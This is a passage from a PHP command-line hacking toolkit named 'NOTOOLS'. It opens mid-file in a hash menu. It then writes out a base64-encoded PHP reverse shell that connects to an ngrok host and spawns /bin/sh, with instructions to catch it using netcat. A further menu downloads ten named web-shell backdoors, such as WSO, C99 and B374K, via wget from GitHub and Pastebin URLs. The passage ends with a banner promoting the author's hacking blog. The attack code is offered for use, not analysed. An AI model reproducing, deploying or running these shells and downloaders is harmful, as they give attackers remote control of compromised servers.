      echo "\n[+] success => " . hash('sha384', $in) ."\n\n";
      
    }
    elseif ($no == 7) {
      echo "\n[+] success => " . hash('sha256', $in) ."\n\n";
      
    }
    else{
      echo "\n[-] gagal\n\n";
    }
  }
  elseif($type == 5){
    $a = base64_decode('c2V0X3RpbWVfbGltaXQgKDApOwokVkVSU0lPTiA9ICIxLjAiOwokaXAgPSAnMC50Y3Aubmdyb2suaW8nOyAgLy8gQ0hBTkdFIFRISVMKJHBvcnQgPSAxMDAyMDsgICAgICAgLy8gQ0hBTkdFIFRISVMKJGNodW5rX3NpemUgPSAxNDAwOwokd3JpdGVfYSA9IG51bGw7CiRlcnJvcl9hID0gbnVsbDsKJHNoZWxsID0gJ3VuYW1lIC1hOyB3OyBpZDsgL2Jpbi9zaCAtaSc7CiRkYWVtb24gPSAwOwokZGVidWcgPSAwOwoKLy8KLy8gRGFlbW9uaXNlIG91cnNlbGYgaWYgcG9zc2libGUgdG8gYXZvaWQgem9tYmllcyBsYXRlcgovLwoKLy8gcGNudGxfZm9yayBpcyBoYXJkbHkgZXZlciBhdmFpbGFibGUsIGJ1dCB3aWxsIGFsbG93IHVzIHRvIGRhZW1vbmlzZQovLyBvdXIgcGhwIHByb2Nlc3MgYW5kIGF2b2lkIHpvbWJpZXMuICBXb3J0aCBhIHRyeS4uLgppZiAoZnVuY3Rpb25fZXhpc3RzKCdwY250bF9mb3JrJykpIHsKCS8vIEZvcmsgYW5kIGhhdmUgdGhlIHBhcmVudCBwcm9jZXNzIGV4aXQKCSRwaWQgPSBwY250bF9mb3JrKCk7CgkKCWlmICgkcGlkID09IC0xKSB7CgkJcHJpbnRpdCgiRVJST1I6IENhbid0IGZvcmsiKTsKCQlleGl0KDEpOwoJfQoJCglpZiAoJHBpZCkgewoJCWV4aXQoMCk7ICAvLyBQYXJlbnQgZXhpdHMKCX0KCgkvLyBNYWtlIHRoZSBjdXJyZW50IHByb2Nlc3MgYSBzZXNzaW9uIGxlYWRlcgoJLy8gV2lsbCBvbmx5IHN1Y2NlZWQgaWYgd2UgZm9ya2VkCglpZiAocG9zaXhfc2V0c2lkKCkgPT0gLTEpIHsKCQlwcmludGl0KCJFcnJvcjogQ2FuJ3Qgc2V0c2lkKCkiKTsKCQlleGl0KDEpOwoJfQoKCSRkYWVtb24gPSAxOwp9IGVsc2UgewoJcHJpbnRpdCgiV0FSTklORzogRmFpbGVkIHRvIGRhZW1vbmlzZS4gIFRoaXMgaXMgcXVpdGUgY29tbW9uIGFuZCBub3QgZmF0YWwuIik7Cn0KCi8vIENoYW5nZSB0byBhIHNhZmUgZGlyZWN0b3J5CmNoZGlyKCIvIik7CgovLyBSZW1vdmUgYW55IHVtYXNrIHdlIGluaGVyaXRlZAp1bWFzaygwKTsKCi8vCi8vIERvIHRoZSByZXZlcnNlIHNoZWxsLi4uCi8vCgovLyBPcGVuIHJldmVyc2UgY29ubmVjdGlvbgokc29jayA9IGZzb2Nrb3BlbigkaXAsICRwb3J0LCAkZXJybm8sICRlcnJzdHIsIDMwKTsKaWYgKCEkc29jaykgewoJcHJpbnRpdCgiJGVycnN0ciAoJGVycm5vKSIpOwoJZXhpdCgxKTsKfQoKLy8gU3Bhd24gc2hlbGwgcHJvY2VzcwokZGVzY3JpcHRvcnNwZWMgPSBhcnJheSgKICAgMCA9PiBhcnJheSgicGlwZSIsICJyIiksICAvLyBzdGRpbiBpcyBhIHBpcGUgdGhhdCB0aGUgY2hpbGQgd2lsbCByZWFkIGZyb20KICAgMSA9PiBhcnJheSgicGlwZSIsICJ3IiksICAvLyBzdGRvdXQgaXMgYSBwaXBlIHRoYXQgdGhlIGNoaWxkIHdpbGwgd3JpdGUgdG8KICAgMiA9PiBhcnJheSgicGlwZSIsICJ3IikgICAvLyBzdGRlcnIgaXMgYSBwaXBlIHRoYXQgdGhlIGNoaWxkIHdpbGwgd3JpdGUgdG8KKTsKCiRwcm9jZXNzID0gcHJvY19vcGVuKCRzaGVsbCwgJGRlc2NyaXB0b3JzcGVjLCAkcGlwZXMpOwoKaWYgKCFpc19yZXNvdXJjZSgkcHJvY2VzcykpIHsKCXByaW50aXQoIkVSUk9SOiBDYW4ndCBzcGF3biBzaGVsbCIpOwoJZXhpdCgxKTsKfQoKLy8gU2V0IGV2ZXJ5dGhpbmcgdG8gbm9uLWJsb2NraW5nCi8vIFJlYXNvbjogT2Njc2lvbmFsbHkgcmVhZHMgd2lsbCBibG9jaywgZXZlbiB0aG91Z2ggc3RyZWFtX3NlbGVjdCB0ZWxscyB1cyB0aGV5IHdvbid0CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcGVzWzBdLCAwKTsKc3RyZWFtX3NldF9ibG9ja2luZygkcGlwZXNbMV0sIDApOwpzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1syXSwgMCk7CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHNvY2ssIDApOwoKcHJpbnRpdCgiU3VjY2Vzc2Z1bGx5IG9wZW5lZCByZXZlcnNlIHNoZWxsIHRvICRpcDokcG9ydCIpOwoKd2hpbGUgKDEpIHsKCS8vIENoZWNrIGZvciBlbmQgb2YgVENQIGNvbm5lY3Rpb24KCWlmIChmZW9mKCRzb2NrKSkgewoJCXByaW50aXQoIkVSUk9SOiBTaGVsbCBjb25uZWN0aW9uIHRlcm1pbmF0ZWQiKTsKCQlicmVhazsKCX0KCgkvLyBDaGVjayBmb3IgZW5kIG9mIFNURE9VVAoJaWYgKGZlb2YoJHBpcGVzWzFdKSkgewoJCXByaW50aXQoIkVSUk9SOiBTaGVsbCBwcm9jZXNzIHRlcm1pbmF0ZWQiKTsKCQlicmVhazsKCX0KCgkvLyBXYWl0IHVudGlsIGEgY29tbWFuZCBpcyBlbmQgZG93biAkc29jaywgb3Igc29tZQoJLy8gY29tbWFuZCBvdXRwdXQgaXMgYXZhaWxhYmxlIG9uIFNURE9VVCBvciBTVERFUlIKCSRyZWFkX2EgPSBhcnJheSgkc29jaywgJHBpcGVzWzFdLCAkcGlwZXNbMl0pOwoJJG51bV9jaGFuZ2VkX3NvY2tldHMgPSBzdHJlYW1fc2VsZWN0KCRyZWFkX2EsICR3cml0ZV9hLCAkZXJyb3JfYSwgbnVsbCk7CgoJLy8gSWYgd2UgY2FuIHJlYWQgZnJvbSB0aGUgVENQIHNvY2tldCwgc2VuZAoJLy8gZGF0YSB0byBwcm9jZXNzJ3MgU1RESU4KCWlmIChpbl9hcnJheSgkc29jaywgJHJlYWRfYSkpIHsKCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTT0NLIFJFQUQiKTsKCQkkaW5wdXQgPSBmcmVhZCgkc29jaywgJGNodW5rX3NpemUpOwoJCWlmICgkZGVidWcpIHByaW50aXQoIlNPQ0s6ICRpbnB1dCIpOwoJCWZ3cml0ZSgkcGlwZXNbMF0sICRpbnB1dCk7Cgl9CgoJLy8gSWYgd2UgY2FuIHJlYWQgZnJvbSB0aGUgcHJvY2VzcydzIFNURE9VVAoJLy8gc2VuZCBkYXRhIGRvd24gdGNwIGNvbm5lY3Rpb24KCWlmIChpbl9hcnJheSgkcGlwZXNbMV0sICRyZWFkX2EpKSB7CgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU1RET1VUIFJFQUQiKTsKCQkkaW5wdXQgPSBmcmVhZCgkcGlwZXNbMV0sICRjaHVua19zaXplKTsKCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTVERPVVQ6ICRpbnB1dCIpOwoJCWZ3cml0ZSgkc29jaywgJGlucHV0KTsKCX0KCgkvLyBJZiB3ZSBjYW4gcmVhZCBmcm9tIHRoZSBwcm9jZXNzJ3MgU1RERVJSCgkvLyBzZW5kIGRhdGEgZG93biB0Y3AgY29ubmVjdGlvbgoJaWYgKGluX2FycmF5KCRwaXBlc1syXSwgJHJlYWRfYSkpIHsKCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTVERFUlIgUkVBRCIpOwoJCSRpbnB1dCA9IGZyZWFkKCRwaXBlc1syXSwgJGNodW5rX3NpemUpOwoJCWlmICgkZGVidWcpIHByaW50aXQoIlNUREVSUjogJGlucHV0Iik7CgkJZndyaXRlKCRzb2NrLCAkaW5wdXQpOwoJfQp9CgpmY2xvc2UoJHNvY2spOwpmY2xvc2UoJHBpcGVzWzBdKTsKZmNsb3NlKCRwaXBlc1sxXSk7CmZjbG9zZSgkcGlwZXNbMl0pOwpwcm9jX2Nsb3NlKCRwcm9jZXNzKTsKCi8vIExpa2UgcHJpbnQsIGJ1dCBkb2VzIG5vdGhpbmcgaWYgd2UndmUgZGFlbW9uaXNlZCBvdXJzZWxmCi8vIChJIGNhbid0IGZpZ3VyZSBvdXQgaG93IHRvIHJlZGlyZWN0IFNURE9VVCBsaWtlIGEgcHJvcGVyIGRhZW1vbikKZnVuY3Rpb24gcHJpbnRpdCAoJHN0cmluZykgewoJaWYgKCEkZGFlbW9uKSB7CgkJcHJpbnQgIiRzdHJpbmdcbiI7Cgl9Cn0K');
    $file = fopen('reverse.php', 'w');
    $files = fwrite($file, $a);
    fclose($file);
    if ($files) {
      echo "[+] Success Spawn => reverse.php\n";
      echo "\n [+]Options \n
        - open file reverse.php
        - input your IP and PORT and save
        - run this using netcat
      \n";

    }

  }
  elseif($type == 6){
    echo "\n[!] Wget required!\n";
    echo "[+] Backdoor List list [+]\n\n";
    echo "1. IndoXploit Shell \t 6. BlackHat Shell\n";
    echo "2. WSO Shell \t\t 7. Brudul Shell\n";
    echo "3. B374K Shell \t\t 8. 1n73ction v3\n";
    echo "4. C99 Shell \t\t 9. Noname Shell\n";
    echo "5. Pouya Shell \t\t 10. Mini Shell\n\n";  
    echo "=> Input : ";
    $is = trim(fgets(STDIN));
    if ($is == 1) {
      $ex = system('wget https://raw.githubusercontent.com/linuxsec/indoxploit-shell/master/shell-v3.php -O idx.php');
      if($ex){
        echo "[+] Success Spawn => idx.php\n";
      }
    }
    elseif($is == 2){
      $ex = system('wget https://raw.githubusercontent.com/tennc/webshell/master/php/wso/wso.php');
      if ($ex) {
        echo "[+] Success Spawn => wso.php\n";
      }
    }
    elseif($is == 3){
      $ex = system('wget https://raw.githubusercontent.com/tennc/webshell/master/php/b374k/b374k-3.2.3.php -O b374k.php');
      if ($ex) {
        echo "[+] Success Spawn => b374k.php\n";
      }
    }
    elseif($is == 4){
      $ex = system('wget https://raw.githubusercontent.com/tennc/webshell/master/php/PHPshell/c99shell/c99shell.php');
      if ($ex) {
        echo "[+] Success Spawn => c99shell.php\n";
      }
    }
    elseif($is == 5){
      $ex = system('wget https://github.com/ismailtasdelen/shell-backdoor-list/raw/master/shell/asp/pouya.asp');
      if ($ex) {
        echo "[+] Success Spawn => pouya.asp\n";
      }
    }
    elseif($is == 6){
      $ex = system('wget http://pastebin.com/raw/3L2ESWe -O bht.php');
      if ($ex) {
        echo "[+] Success Spawn => bht.php\n";
      }
    }
    elseif($is == 7){
      $ex = system('wget http://pastebin.com/raw/PQaeQF2Y -O brudul.php');
      if ($ex) {
        echo "[+] Success Spawn => brudul.php\n";
      }
    }
    elseif($is == 8){
      $ex = system('wget http://pastebin.com/raw/nxxL8c1f -O ijt.php');
      if ($ex) {
        echo "[+] Success Spawn => ijt.php\n";
      }
    }
    elseif($is == 9){
      $ex = system('wget http://pastebin.com/raw/i201SrEy -O noname.php');
      if ($ex) {
        echo "[+] Success Spawn => noname.php\n";
      }
    }
    elseif($is == 10){
      $ex = system('wget https://pastebin.com/raw/x00ny2KA -O mini.php');
      if ($ex) {
        echo "[+] Success Spawn => mini.php\n";
      }
    }
    else{
      echo "[-] Not Found!\n";
    }
  }
  else {
         echo "Not Found!\n";
      }
}
elseif($wel == 2){
  echo "[+] NOTOOLS [+]

    WHAT IS NOTOOLS?
      NOTOOLS is a tools for hacking, exploiting, and cracking, this tools 
      being in the development stage, so look forward to the next update.
      
    YOU HAVE ERROR ON THIS TOOLS?
    contact : https://www.facebook.com/akazh.gov

    LEARN PENERATION TESTING, CYBER SECURITY, PROGRAMMING, AND HACKING ON MY BLOG 
    http://www.nobsec.net

    DON'T FORGET TO LIKE MY FANSPAGE 
    contact : https://www.facebook.com/NobSecOfficial


    [+] 4nzeL4 [+]
\n";  
}else{
  echo "[-] Not Found!";
}
?>